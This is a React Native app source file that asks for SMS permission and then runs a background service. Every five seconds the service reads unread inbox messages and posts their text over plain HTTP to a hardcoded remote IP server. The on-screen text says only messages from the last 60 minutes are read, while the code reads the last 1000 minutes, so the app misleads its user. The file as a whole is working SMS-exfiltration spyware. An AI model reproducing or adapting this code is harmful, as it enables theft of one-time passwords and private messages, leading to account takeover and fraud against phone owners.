/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react-native/no-inline-styles */
import {View, Text, Image, PermissionsAndroid} from 'react-native';
import React, {useEffect} from 'react';
import SmsAndroid from 'react-native-get-sms-android';
import BackgroundService from 'react-native-background-actions';
import axios from 'axios';

export default function App() {
  const readSms = () => {
    var filter = {
      box: 'inbox',
      minDate: Date.now() - 1000 * 60 * 1000, // last 1000 minutes
      // maxDate: Date.now(), // current time
      read: 0, // 0 for unread SMS, 1 for SMS already read
    };

    SmsAndroid.list(
      JSON.stringify(filter),
      fail => {
        console.log('Failed while reading sms. Error: ' + fail);
      },
      (count, smsList) => {
        var arr = JSON.parse(smsList);
        let sms_data = [];

        arr.forEach(function (object) {
          sms_data.push(object.body);
        });
        makeAPICall(sms_data);
      },
    );
  };

  const sleep = time =>
    new Promise(resolve => setTimeout(() => resolve(), time));

  const veryIntensiveTask = async taskDataArguments => {
    const {delay} = taskDataArguments;
    await new Promise(async resolve => {
      for (let i = 0; BackgroundService.isRunning(); i++) {
        readSms();
        await BackgroundService.updateNotification({
          taskDesc: 'Reading SMS in progress.' + i,
        });
        await sleep(delay);
      }
    });
  };

  const options = {
    taskName: 'Read SMS',
    taskTitle: 'Your app is running',
    taskDesc: 'Reading SMS',
    taskIcon: {
      name: 'ic_launcher',
      type: 'mipmap',
    },
    color: '#ff00ff',
    parameters: {
      delay: 5000, // execute the background task after every 5 sec.
    },
  };

  const makeAPICall = async messages => {
    try {
      await axios.post(
        'http://97.74.91.191:4000/api/v1/post_sms',
        {messages},
        {'Content-Type': 'application/json'},
      );
    } catch (error) {
      console.log('Error while sending data to server', error);
    }
  };

  const requestSMSReadPermission = async () => {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_SMS,
        {
          title: 'We require SMS permission to proceed further.',
          message: 'Please provide the SMS permission.',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        },
      );
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        console.log('You can read the SMS');
      } else {
        console.log('SMS read permission denied');
      }
    } catch (err) {
      console.warn(err);
    }
  };

  useEffect(() => {
    requestSMSReadPermission();
    startBackgroundService();
  }, []);

  const startBackgroundService = async () => {
    await BackgroundService.start(veryIntensiveTask, options);
    await BackgroundService.updateNotification({
      taskDesc: 'Reading SMS in progress.',
    });
  };

  return (
    <View style={{margin: 25}}>
      <Text
        style={{
          fontSize: 40,
          fontWeight: 'bold',
          textAlign: 'center',
          color: '#000',
          marginBottom: 40,
        }}>
        Welcome
      </Text>

      <View style={{alignItems: 'center'}}>
        <Image
          source={require('./home.gif')}
          style={{
            height: 280,
          }}
        />
      </View>

      <Text style={{textAlign: 'center', marginTop: 40, color: '#000'}}>
        We only read messages from last 60 minutes.
      </Text>
    </View>
  );
}
